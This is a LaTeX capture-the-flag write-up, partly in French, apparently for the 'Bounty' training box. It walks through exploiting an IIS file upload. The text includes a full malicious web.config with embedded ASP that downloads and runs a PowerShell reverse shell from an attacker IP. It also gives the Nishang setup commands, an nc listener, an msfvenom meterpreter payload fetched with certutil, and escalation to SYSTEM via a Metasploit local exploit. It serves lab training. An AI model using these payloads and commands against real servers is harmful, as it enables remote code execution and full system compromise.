\chapter{Bounty}
\begin{itemize}
    \item {\bf technics}: \verb+web.config+ rce
    \item {\bf Components}: 
    \item {\bf tools}: 
\end{itemize}


\section{Résumé}


\section{Details}

\subsection{Recon}
\subsubsection{nmap}
\begin{verbatim}
$ sudo nmap -sV -sC -oX bounty.xml 10.10.10.93
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-30 18:29 CEST
Nmap scan report for 10.10.10.93
Host is up (0.029s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-title: Bounty
|_http-server-header: Microsoft-IIS/7.5
| http-methods:
|_  Potentially risky methods: TRACE
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
\end{verbatim}

\subsubsection{x}
\begin{verbatim}
$ ffuf -u http://10.10.10.93/FUZZ \
    -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

UploadedFiles           [Status: 301, Size: 156, Words: 9, Lines: 2, Duration: 28ms]

$ ffuf -u http://10.10.10.93/FUZZ \
    -w
    /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\
    -e .aspx,.asp

transfer.aspx           [Status: 200, Size: 941, Words: 89, Lines: 22, Duration: 85ms]
\end{verbatim}

\begin{verbatim}
POST http://10.10.10.93/transfer.aspx HTTP/1.1
Host: 10.10.10.93
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:105.0) Gecko/20100101 Firefox/105.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Content-Type: multipart/form-data; boundary=---------------------------34971746475247216692866042189
Content-Length: 751
Origin: https://10.10.10.93
Connection: keep-alive
Referer: https://10.10.10.93/transfer.aspx
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

-----------------------------34971746475247216692866042189
Content-Disposition: form-data; name="__VIEWSTATE"

/wEPDwUKMTI3ODM5MzQ0Mg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkegaKvLjHBqcGi9T9kb2EtdRiAoU=
-----------------------------34971746475247216692866042189
Content-Disposition: form-data; name="__EVENTVALIDATION"

/wEWAgL8tJrOCgLt3oXMA2mLHwZUhws7tMcg8WSmoczCUaKf
-----------------------------34971746475247216692866042189
Content-Disposition: form-data; name="FileUpload1"; filename="test.txt"
Content-Type: text/plain

merlin.jpg

-----------------------------34971746475247216692866042189
Content-Disposition: form-data; name="btnUpload"

Upload
-----------------------------34971746475247216692866042189--
\end{verbatim}

on ne peut pas upload de txt par contre un jpg ca passe.

on peut après le consulter sur
\verb+https://10.10.10.93/uploadedfiles/merlin.jpg+

on produit une erreur 500
\begin{verbatim}
-----------------------------178922093217320551434143055476
Content-Disposition: form-data; name="__VIEWSTATE"

/a
-----------------------------178922093217320551434143055476
Content-Disposition: form-data; name="__EVENTVALIDATION"

/b
-----------------------------178922093217320551434143055476
Content-Disposition: form-data; name="FileUpload1"; filename="test.txt"
Content-Type: text/plain

background1.jpg

-----------------------------178922093217320551434143055476
Content-Disposition: form-data; name="btnUpload"

Upload
-----------------------------178922093217320551434143055476--
\end{verbatim}

les 2 parametres hidden ne semblent pas decodables.


et un \verb+web.config+:
\begin{verbatim}
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
<system.webServer>
<handlers accessPolicy="Read, Script, Write">
<add name="web_config" path="*.config" verb="*" modules="IsapiModule"
scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified"
requireAccess="Write" preCondition="bitness64" />
</handlers>
<security>
<requestFiltering>
<fileExtensions>
<remove fileExtension=".config" />
</fileExtensions>
<hiddenSegments>
<remove segment="web.config" />
</hiddenSegments>
</requestFiltering>
</security>
</system.webServer>
<appSettings>
</appSettings>
</configuration>
<%
CreateObject("WScript.Shell").Exec("cmd /c powershell IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.3/Invoke-PowerShellTcp.ps1')")
%>
\end{verbatim}

pour le revershell on utilise
\href{https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1}{Nishang
Invoke-PowerShellTcp.ps1}

\begin{verbatim}
curl -O https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
echo 'Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.3 -Port 4444' >> Invoke-PowerShellTcp.ps1
\end{verbatim}


puis \verb+http://10.10.10.93/uploadedfiles/web.config+

\subsection{Foothold}
\subsubsection{x}
\begin{verbatim}
$ nc -lnvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.10.93 49160
Windows PowerShell running as user BOUNTY$ on BOUNTY
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\windows\system32\inetsrv>
> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled


>cd \Users\merlin\desktop
PS C:\Users\merlin\desktop> dir
PS C:\Users\merlin\desktop> ls -force


    Directory: C:\Users\merlin\desktop


Mode                LastWriteTime     Length Name
----                -------------     ------ ----
-a-hs         5/30/2018  12:22 AM        282 desktop.ini
-arh-         10/1/2022   3:21 AM         34 user.txt
\end{verbatim}

\begin{verbatim}
> systeminfo

Host Name:                 BOUNTY
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter

> wmic qfe list

>
\end{verbatim}

windows 2008 no patch

\begin{verbatim}

$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.3 LPORTr= 5555 -f exe > meter.exe


> certutil.exe -urlcache -split -f http://10.10.16.3/meter.exe meter.exe

msf6 post(multi/recon/local_exploit_suggester) >

exploit/windows/local/ms16_014_wmi_recv_notif

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
\end{verbatim}

\section{Theorie}


